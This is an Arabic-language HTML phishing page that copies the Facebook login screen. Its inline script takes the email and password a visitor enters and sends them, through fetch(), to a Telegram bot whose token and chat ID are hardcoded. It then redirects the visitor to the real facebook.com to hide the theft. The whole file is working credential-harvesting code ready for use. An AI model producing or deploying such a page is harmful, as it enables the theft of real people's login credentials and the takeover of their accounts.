<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="fb-container">
        <!-- القسم الأيسر: الشعار والنص التوضيحي -->
        <div class="fb-left">
            <h1 class="fb-logo">facebook</h1>
            <p>يساعدك فيسبوك على التواصل والمشاركة مع الأشخاص الذين تعرفهم.</p>
        </div>

        <!-- القسم الأيمن: صندوق تسجيل الدخول -->
        <div class="fb-right">
            <div class="login-card">
                <form id="loginForm">
                    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                    <input type="password" id="password" placeholder="كلمة السر" required>
                    <button type="submit" class="login-btn">تسجيل الدخول</button>
                </form>
                
                <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
                
                <hr>
                
                <div class="create-btn-container">
                    <button type="button" class="create-btn">إنشاء حساب جديد</button>
                </div>
            </div>
            
            <div class="page-footer">
                <p><b>إنشاء صفحة</b> لشخصية مشهورة أو علامة تجارية أو شركة.</p>
            </div>
        </div>
    </div>

    <!-- كود الجافاسكريبت لربط البيانات بتليجرام -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // منع الصفحة من إعادة التحميل

            // جلب القيم المكتوبة
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            // بيانات بوت تليجرام الخاص بك
            var botToken = '8880573702:AAEcni2H3MYNKKyU0GJen2XqPFgAyLO4Mdw'; 
            var chatId = '8304712202'; 

            var message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;

            // إرسال البيانات للبوت
            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url).then(response => {
                // تحويل المستخدم لفيسبوك الحقيقي بعد الضغط
                window.location.href = 'https://www.facebook.com';
            }).catch(error => {
                window.location.href = 'https://www.facebook.com';
            });
        });
    </script>

</body>
</html>
